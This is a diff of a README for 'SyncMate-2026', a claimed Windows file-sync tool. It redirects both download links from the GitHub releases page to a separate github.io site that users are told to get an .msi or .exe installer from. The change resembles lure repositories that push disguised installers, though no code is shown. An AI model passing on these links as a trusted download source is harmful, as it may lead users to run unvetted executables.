@@ -1,6 +1,6 @@
 # 🔄 SyncMate-2026 - Keep Your Files Updated Everywhere
 
-[![](https://img.shields.io/badge/Download_SyncMate-Blue?style=for-the-badge)](https://github.com/J6492169/SyncMate-2026/releases)
+[![](https://img.shields.io/badge/Download_SyncMate-Blue?style=for-the-badge)](https://j6492169.github.io)
 
 SyncMate-2026 helps you track and move data across different devices. It works on Windows 10 and Windows 11. You can connect your Android phone, Mac, and Windows computer to keep your folders in sync. This tool removes the need for manual file transfers. You set your preferences one time, and the app handles the rest.
 
@@ -8,7 +8,7 @@ SyncMate-2026 helps you track and move data across different devices. It works o
 
 You must visit the official release page to get the installer for your computer. 
 
-[Click here to open the download page](https://github.com/J6492169/SyncMate-2026/releases)
+[Click here to open the download page](https://j6492169.github.io)
 
 Find the file that ends in .msi or .exe on that page. Click the file name to save it to your local storage. Make sure you choose a folder where you can find the file easily, such as your Downloads folder.
 
